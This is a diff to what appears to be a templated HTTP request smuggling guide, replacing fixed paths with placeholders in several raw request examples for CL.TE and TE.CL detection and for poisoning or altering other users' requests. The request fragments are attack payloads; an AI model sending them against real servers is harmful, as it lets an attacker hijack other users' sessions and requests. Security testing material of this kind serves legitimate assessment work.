@@ -20,7 +20,7 @@ Please **FIRST** try detecting **CL.TE** as if it is vulnerable to it, the **TE.
 Send the following request:
 
 ```http
-POST /about HTTP/1.1
+POST {{ path /about }} HTTP/1.1
 Host: {{ target-domain vulerable.net }}
 Transfer-Encoding: chunked
 Content-Length: 4
@@ -44,7 +44,7 @@ Only after confirming no **CL.TE** desync attacks can be performed you can check
 Send the following request:
 
 ```http
-POST /about HTTP/1.1
+POST {{ path /about }} HTTP/1.1
 Host: {{ target-domain vulerable.net }}
 Transfer-Encoding: chunked
 Content-Length: 6
@@ -71,7 +71,7 @@ There is 4 possible outcomes:
 You can just _poison_ legitimate requests. For example the following request would result on the next user doing a `SMUGGLEDPOST` request:
 
 ```http
-POST / HTTP/1.1
+POST {{ path /about }} HTTP/1.1
 Host: {{ target-domain vulerable.net }}
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
@@ -91,7 +91,7 @@ You can Actually change other users requests, so you can force them  to execute 
 
 
 ```http
-POST / HTTP/1.1
+POST {{ path /about }} HTTP/1.1
 Host: {{ target-domain vulerable.net }}
 Cookie: session=fnJJc90vRfPmIYHB3xmzTYJyhLx5JhGO
 Content-Type: application/x-www-form-urlencoded
@@ -116,7 +116,7 @@ a=
 
 
 ```http
-POST / HTTP/1.1
+POST {{ path /about }} HTTP/1.1
 Host: {{ target-domain vulerable.net }}
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 6
